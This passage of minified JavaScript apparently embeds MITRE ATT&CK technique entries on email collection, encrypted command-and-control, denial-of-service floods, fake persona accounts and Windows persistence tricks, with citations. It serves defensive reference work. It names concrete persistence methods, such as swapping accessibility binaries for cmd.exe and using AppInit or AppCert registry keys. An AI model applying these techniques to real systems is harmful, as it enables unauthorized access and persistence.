href='https:\u002F\u002Fblogs.technet.microsoft.com\u002Ftimmcmic\u002F2015\u002F06\u002F08\u002Fexchange-and-office-365-mail-forwarding-2\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.";qJ.external_references=[{source_name:b,external_id:qK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1114\u002F003"},{source_name:bo,url:bp,description:bq},{source_name:qI,url:qH,description:qG}];qJ["subtechnique-of"]=bz;qL.id=qM;qL["object-type"]=a;qL.name="Local Email Collection";qL.description="Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpractical365.com\u002Fclients\u002Foffice-365-proplus\u002Foutlook-cached-mode-ost-file-sizes\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\\u003Cusername\u003E\\Documents\\Outlook Files` or `C:\\Users\\\u003Cusername\u003E\\AppData\\Local\\Microsoft\\Outlook`.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.office.com\u002Fen-us\u002Farticle\u002Fintroduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";qL.external_references=[{source_name:b,external_id:qM,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1114\u002F001"},{source_name:"Outlook File Sizes",url:"https:\u002F\u002Fpractical365.com\u002Fclients\u002Foffice-365-proplus\u002Foutlook-cached-mode-ost-file-sizes\u002F",description:"N. O'Bryan. (2018, May 30). Managing Outlook Cached Mode and OST File Sizes. Retrieved February 19, 2020."},{source_name:"Microsoft Outlook Files",url:"https:\u002F\u002Fsupport.office.com\u002Fen-us\u002Farticle\u002Fintroduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790",description:"Microsoft. (n.d.). Introduction to Outlook Data Files (.pst and .ost). Retrieved February 19, 2020."}];qL["subtechnique-of"]=bz;qN.id=qO;qN["object-type"]=a;qN.name="Remote Email Collection";qN.description="Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0413'\u003EMailSniper\u003C\u002Fa\u003E can be used to automate searches for specific keywords.";qN.external_references=[{source_name:b,external_id:qO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1114\u002F002"}];qN["subtechnique-of"]=bz;qV.id=qW;qV["object-type"]=a;qV.name="Asymmetric Cryptography";qV.description="Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL\u002FTLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1573\u002F002'\u003EAsymmetric Cryptography\u003C\u002Fa\u003E.";qV.external_references=[{source_name:b,external_id:qW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1573\u002F002"},{url:qP,description:qQ,source_name:qR},{url:qS,description:qT,source_name:qU},{url:f,description:g,source_name:h}];qV["subtechnique-of"]=cI;qX.id=qY;qX["object-type"]=a;qX.name="Symmetric Cryptography";qX.description="Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.";qX.external_references=[{source_name:b,external_id:qY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1573\u002F001"},{url:f,description:g,source_name:h}];qX["subtechnique-of"]=cI;rl.id=rm;rl["object-type"]=a;rl.name="Application Exhaustion Flood";rl.description="Adversaries may target resource intensive features of web applications to cause a denial of service (DoS). Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fpages.arbornetworks.com\u002Frs\u002F082-KNA-087\u002Fimages\u002F13th_Worldwide_Infrastructure_Security_Report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rl.external_references=[{source_name:b,external_id:rm,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1499\u002F003"},{source_name:cJ,url:cK,description:cL},{source_name:at,url:au,description:av}];rl["subtechnique-of"]=aQ;rn.id=ro;rn["object-type"]=a;rn.name="Application or System Exploitation";rn.description="Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.sucuri.net\u002F2015\u002F08\u002Fbind9-denial-of-service-exploit-in-the-wild.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.";rn.external_references=[{source_name:b,external_id:ro,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1499\u002F004"},{source_name:"Sucuri BIND9 August 2015",url:"https:\u002F\u002Fblog.sucuri.net\u002F2015\u002F08\u002Fbind9-denial-of-service-exploit-in-the-wild.html",description:"Cid, D.. (2015, August 2). BIND9 – Denial of Service Exploit in the Wild. Retrieved April 26, 2019."}];rn["subtechnique-of"]=aQ;rp.id=rq;rp["object-type"]=a;rp.name="OS Exhaustion Flood";rp.description="Adversaries may target the operating system (OS) for a DoS attack, since the (OS) is responsible for managing the finite resources on a system. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpages.arbornetworks.com\u002Frs\u002F082-KNA-087\u002Fimages\u002F13th_Worldwide_Infrastructure_Security_Report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cloudflare.com\u002Flearning\u002Fddos\u002Fsyn-flood-ddos-attack\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and\u002For unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.corero.com\u002Fresources\u002Fddos-attack-types\u002Fsyn-flood-ack.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rp.external_references=[{source_name:b,external_id:rq,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1499\u002F001"},{external_id:"CAPEC-469",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F469.html"},{external_id:"CAPEC-482",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F482.html"},{source_name:cJ,url:cK,description:cL},{source_name:"Cloudflare SynFlood",url:"https:\u002F\u002Fwww.cloudflare.com\u002Flearning\u002Fddos\u002Fsyn-flood-ddos-attack\u002F",description:"Cloudflare. (n.d.). What is a SYN flood attack?. Retrieved April 22, 2019."},{source_name:"Corero SYN-ACKflood",url:"https:\u002F\u002Fwww.corero.com\u002Fresources\u002Fddos-attack-types\u002Fsyn-flood-ack.html",description:"Corero. (n.d.). What is a SYN-ACK Flood Attack?. Retrieved April 22, 2019."},{source_name:at,url:au,description:av}];rp["subtechnique-of"]=aQ;rr.id=rs;rr["object-type"]=a;rr.name="Service Exhaustion Flood";rr.description="Adversaries may target the different network services provided by systems to conduct a DoS. Adversaries often target DNS and web services, however others have been targeted as well.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpages.arbornetworks.com\u002Frs\u002F082-KNA-087\u002Fimages\u002F13th_Worldwide_Infrastructure_Security_Report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and\u002For an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cloudflare.com\u002Flearning\u002Fddos\u002Fhttp-flood-ddos-attack\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL\u002FTLS. The SSL\u002FTLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL\u002FTLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.netscout.com\u002Fblog\u002Fasert\u002Fddos-attacks-ssl-something-old-something-new'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rr.external_references=[{source_name:b,external_id:rs,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1499\u002F002"},{external_id:"CAPEC-488",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F488.html"},{external_id:"CAPEC-489",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F489.html"},{external_id:"CAPEC-528",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F528.html"},{source_name:cJ,url:cK,description:cL},{source_name:"Cloudflare HTTPflood",url:"https:\u002F\u002Fwww.cloudflare.com\u002Flearning\u002Fddos\u002Fhttp-flood-ddos-attack\u002F",description:"Cloudflare. (n.d.). What is an HTTP flood DDoS attack?. Retrieved April 22, 2019."},{source_name:"Arbor SSLDoS April 2012",url:"https:\u002F\u002Fwww.netscout.com\u002Fblog\u002Fasert\u002Fddos-attacks-ssl-something-old-something-new",description:"ASERT Team, Netscout Arbor. (2012, April 24). DDoS Attacks on SSL: Something Old, Something New. Retrieved April 22, 2019."},{source_name:at,url:au,description:av}];rr["subtechnique-of"]=aQ;ru.id=rv;ru["object-type"]=a;ru.name=mM;ru.description="Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also take steps to cultivate a persona around the email account, such as through use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585\u002F001'\u003ESocial Media Accounts\u003C\u002Fa\u003E, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F001'\u003EDomains\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fr980-ransomware-disposable-email-service\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";ru.external_references=[{source_name:b,external_id:rv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585\u002F002"},{url:ai,description:aj,source_name:ak},{source_name:"Trend Micro R980 2016",url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fr980-ransomware-disposable-email-service\u002F",description:"Antazo, F. and Yambao, M. (2016, August 10). R980 Ransomware Found Abusing Disposable Email Address Service. Retrieved October 13, 2020."}];ru["subtechnique-of"]=bA;rw.id=rx;rw["object-type"]=a;rw.name=mP;rw.description="Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.securityweek.com\u002Firanian-hackers-targeted-us-officials-elaborate-social-media-attack-operation'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmedia.blackhat.com\u002Fbh-us-10\u002Fwhitepapers\u002FRyan\u002FBlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.securityweek.com\u002Firanian-hackers-targeted-us-officials-elaborate-social-media-attack-operation'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fmedia.blackhat.com\u002Fbh-us-10\u002Fwhitepapers\u002FRyan\u002FBlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F003'\u003ESpearphishing via Service\u003C\u002Fa\u003E).";rw.external_references=[{source_name:b,external_id:rx,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585\u002F001"},{source_name:et,description:eu,url:ev},{source_name:ew,description:ex,url:ey}];rw["subtechnique-of"]=bA;ry.id=rz;ry["object-type"]=a;ry.name="Accessibility Features";ry.description="Adversaries may establish persistence and\u002For elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are \u003Ccode\u003EC:\\Windows\\System32\\sethc.exe\u003C\u002Fcode\u003E, launched when the shift key is pressed five times and \u003Ccode\u003EC:\\Windows\\System32\\utilman.exe\u003C\u002Fcode\u003E, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2012\u002F08\u002Fhikit-rootkit-advanced-persistent-attack-techniques-part-1.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers\u002Freferences to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in \u003Ccode\u003E%systemdir%\\\u003C\u002Fcode\u003E, and it must be protected by Windows File or Resource Protection (WFP\u002FWRP). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.slideshare.net\u002FDennisMaldonado5\u002Fsticky-keys-to-the-kingdom'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F012'\u003EImage File Execution Options Injection\u003C\u002Fa\u003E debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003\u002FR2 and later, for example, the program (e.g., \u003Ccode\u003EC:\\Windows\\System32\\utilman.exe\u003C\u002Fcode\u003E) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F001'\u003ERemote Desktop Protocol\u003C\u002Fa\u003E will cause the replaced file to be executed with SYSTEM privileges. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.crowdstrike.com\u002Fregistry-analysis-with-crowdresponse\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOther accessibility features exist that may also be leveraged in a similar fashion: \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.slideshare.net\u002FDennisMaldonado5\u002Fsticky-keys-to-the-kingdom'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgiuliocomi.blogspot.com\u002F2019\u002F10\u002Fabusing-windows-10-narrators-feedback.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\n* On-Screen Keyboard: \u003Ccode\u003EC:\\Windows\\System32\\osk.exe\u003C\u002Fcode\u003E\n* Magnifier: \u003Ccode\u003EC:\\Windows\\System32\\Magnify.exe\u003C\u002Fcode\u003E\n* Narrator: \u003Ccode\u003EC:\\Windows\\System32\\Narrator.exe\u003C\u002Fcode\u003E\n* Display Switcher: \u003Ccode\u003EC:\\Windows\\System32\\DisplaySwitch.exe\u003C\u002Fcode\u003E\n* App Switcher: \u003Ccode\u003EC:\\Windows\\System32\\AtBroker.exe\u003C\u002Fcode\u003E";ry.external_references=[{source_name:b,external_id:rz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F008"},{external_id:"CAPEC-558",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F558.html"},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2012\u002F08\u002Fhikit-rootkit-advanced-persistent-attack-techniques-part-1.html",description:"Glyer, C., Kazanciyan, R. (2012, August 20). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 1). Retrieved June 6, 2016.",source_name:"FireEye Hikit Rootkit"},{url:"https:\u002F\u002Fwww.slideshare.net\u002FDennisMaldonado5\u002Fsticky-keys-to-the-kingdom",description:"Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.",source_name:"DEFCON2016 Sticky Keys"},{url:rA,description:rB,source_name:rC},{source_name:"Narrator Accessibility Abuse",url:"https:\u002F\u002Fgiuliocomi.blogspot.com\u002F2019\u002F10\u002Fabusing-windows-10-narrators-feedback.html",description:"Comi, G. (2019, October 19). Abusing Windows 10 Narrator's 'Feedback-Hub' URI for Fileless Persistence. Retrieved April 28, 2020."}];ry["subtechnique-of"]=s;rD.id=rE;rD["object-type"]=a;rD.name="AppCert DLLs";rD.description="Adversaries may establish persistence and\u002For elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the \u003Ccode\u003EAppCertDLLs\u003C\u002Fcode\u003E Registry key under \u003Ccode\u003EHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\\u003C\u002Fcode\u003E are loaded into every process that calls the ubiquitously used application programming interface (API) functions \u003Ccode\u003ECreateProcess\u003C\u002Fcode\u003E, \u003Ccode\u003ECreateProcessAsUser\u003C\u002Fcode\u003E, \u003Ccode\u003ECreateProcessWithLoginW\u003C\u002Fcode\u003E, \u003Ccode\u003ECreateProcessWithTokenW\u003C\u002Fcode\u003E, or \u003Ccode\u003EWinExec\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSimilar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055'\u003EProcess Injection\u003C\u002Fa\u003E, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ";rD.external_references=[{source_name:b,external_id:rE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F009"},{url:C,description:D,source_name:E},{url:y,description:z,source_name:A},{url:"https:\u002F\u002Fforum.sysinternals.com\u002Fappcertdlls_topic12546.html",description:"Microsoft. (2007, October 24). Windows Sysinternals - AppCertDlls. Retrieved December 18, 2017.",source_name:"Sysinternals AppCertDlls Oct 2007"}];rD["subtechnique-of"]=s;rF.id=rG;rF["object-type"]=a;rF.name="AppInit DLLs";rF.description="Adversaries may establish persistence and\u002For elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the \u003Ccode\u003EAppInit_DLLs\u003C\u002Fcode\u003E value in the Registry keys \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\u003C\u002Fcode\u003E or \u003Ccode\u003EHKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows\u003C\u002Fcode\u003E are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.microsoft.com\u002Fen-us\u002Fkb\u002F197571'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fdn280412'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";rF.external_references=[{source_name:b,external_id:rG,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F010"},{url:C,description:D,source_name:E},{url:"https:\u002F\u002Fsupport.microsoft.com\u002Fen-us\u002Fkb\u002F197571",description:"Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.",source_name:"AppInit Registry"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fdn280412",description:"Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.",source_name:"AppInit Secure Boot"},{url:y,description:z,source_name:A}];rF["subtechnique-of"]=s;rH.id=rI;rH["object-type"]=a;rH.name="Application Shimming";rH.description="Adversaries may establish persistence and\u002For elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure\u002FFramework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* \u003Ccode\u003E%WINDIR%\\AppPatch\\sysmain.sdb\u003C\u002Fcode\u003E and\n* \u003Ccode\u003Ehklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb\u003C\u002Fcode\u003E\n\nCustom databases are stored in:\n\n* \u003Ccode\u003E%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom\u003C\u002Fcode\u003E and\n* \u003Ccode\u003Ehklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom\u003C\u002Fcode\u003E\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F002'\u003EBypass User Account Control\u003C\u002Fa\u003E (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. \u003Csup\u003E\u003Ca href='http:\u002F\u002Ffiles.brucon.org\u002F2015\u002FTomczak_and_Ballenthin_Shims_for_the_Win.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Shims can also be abused to establish persistence by continuously being invoked by affected programs.";rH.external_references=[{source_name:b,external_id:rI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F011"},{url:C,description:D,source_name:E},{source_name:"FireEye Application Shimming",url:"http:\u002F\u002Ffiles.brucon.org\u002F2015\u002FTomczak_and_Ballenthin_Shims_for_the_Win.pdf",description:"Ballenthin, W., Tomczak, J.. (2015). The Real Shim Shary. Retrieved May 4, 2020."},{url:"https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Feu-15\u002Fmaterials\u002Feu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf",description:"Pierce, Sean. (2015, November). Defending Against Malicious Application Compatibility Shims. Retrieved June 22, 2017.",source_name:"Black Hat 2015 App Shim"}];rH["subtechnique-of"]=s;rJ.id=rK;rJ["object-type"]=a;rJ.name="Change Default File Association";rJ.description="Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.microsoft.com\u002Fen-us\u002Fhelp\u002F18539\u002Fwindows-7-change-default-programs'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fbb166549.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or by administrators using the built-in assoc utility. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-server\u002Fadministration\u002Fwindows-commands\u002Fassoc'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under \u003Ccode\u003EHKEY_CLASSES_ROOT\\.[extension]\u003C\u002Fcode\u003E, for example \u003Ccode\u003EHKEY_CLASSES_ROOT\\.txt\u003C\u002Fcode\u003E. The entries point to a handler for that extension located at \u003Ccode\u003EHKEY_CLASSES_ROOT\\[handler]\u003C\u002Fcode\u003E. The various commands are then listed as subkeys underneath the shell key at 